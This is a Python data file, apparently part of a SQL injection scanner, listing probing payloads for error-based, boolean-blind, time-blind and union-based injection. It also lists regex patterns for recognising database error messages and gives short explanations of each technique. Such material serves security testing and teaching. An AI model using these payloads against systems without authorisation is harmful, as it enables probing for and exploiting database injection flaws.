# payloads.py

payloads = {
    "Error-Based Injection": {
        "payloads": [
            "1' AND 1=1 --",
            "1' AND 1=2 --",
            "1' UNION SELECT NULL, NULL, NULL --"
        ],
        "error_patterns": {
            "MySQL": r"SQL syntax.*MySQL",
            "PostgreSQL": r"PostgreSQL.*ERROR",
            "Microsoft SQL Server": r"Driver.* SQL Server|OLE DB.* SQL Server",
            "Oracle": r"ORA-\\d{5}"
        },
        "explanation": "Error-based injection triggers error messages that reveal database information."
    },
    "Boolean-Based Blind Injection": {
        "payloads": [
            "1 AND 1=1",
            "1 AND 1=2"
        ],
        "explanation": "Boolean-based injection tests how the application responds to different true/false conditions."
    },
    "Time-Based Blind Injection": {
        "payloads": [
            "1 AND SLEEP(5)",
            "1 OR SLEEP(5)"
        ],
        "response_time_threshold": 5,
        "explanation": "Time-based injection introduces delays to infer database behavior without visible output."
    },
    "Union-Based Injection": {
        "payloads": [
            "1 UNION SELECT NULL, NULL, NULL",
            "1 UNION SELECT 1, 'test', NULL"
        ],
        "explanation": "Union-based injection combines results from multiple queries into a single result set."
    }
}
